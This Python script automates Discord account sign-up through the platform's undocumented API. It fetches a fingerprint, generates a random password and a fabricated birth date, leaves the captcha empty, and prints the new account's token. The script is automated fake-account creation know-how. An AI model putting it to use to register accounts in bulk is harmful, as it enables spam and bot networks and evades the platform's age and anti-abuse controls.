import requests
import random
import string
from typing import List
from datetime import datetime, timedelta


class BadOperationError(Exception):
    """"This exception is thrown when there is no specified operation"""
    pass


class Authorization:
    def getFingerPrint(self):
        response = requests.get('https://discord.com/api/v9/experiments').json()
        fingerprint = response['fingerprint']
        return fingerprint

    def generatePassword(self, length: int = 16) -> str:
        """
         Generate a password of a given `length`.
         """
        result: List[str] = []
        choices = string.printable
        while len(result) < length:
            symbol = random.choice(choices)
            result.append(symbol)
        return "".join(result)

    def generateRandomDate(self):
        start_date = datetime(1950, 1, 1)
        end_date = datetime(2000, 1, 1)
        t: timedelta = end_date - start_date
        rand_days: int = random.randrange(t.days)
        result = start_date + timedelta(days=rand_days)
        return result.strftime("%Y-%m-%d")

    def register(self, username: str, email: str) -> None:

        data: dict = {
            'captcha_key': None,
            'consent': True,
            'date_of_birth': self.generateRandomDate(),
            'email': email,
            'fingerprint': self.getFingerPrint(),
            'gift_code_sku_id': None,
            'invite': None,
            'password': self.generatePassword(),
            'promotional_email_opt_in': True,
            'username': username,
        }

        headers: dict = {
            'referer': 'https://discord.com/register',
            'authorization': 'undefined'
        }

        response = requests.post('https://discord.com/api/v9/auth/register', headers=headers, json=data)
        if response.status_code == 201:
            response = response.json()
            print(f'Your login: {email}')
            try:
                return print(f'Your token: {response["token"]}')
            except BadOperationError:
                token = "Could not get token.Try again late"
                return print(token)


if __name__ == "__main__":
    runner = Authorization()
    username = input('Enter your name: ')
    email = input('Enter your email: ')
    runner.register(username, email)
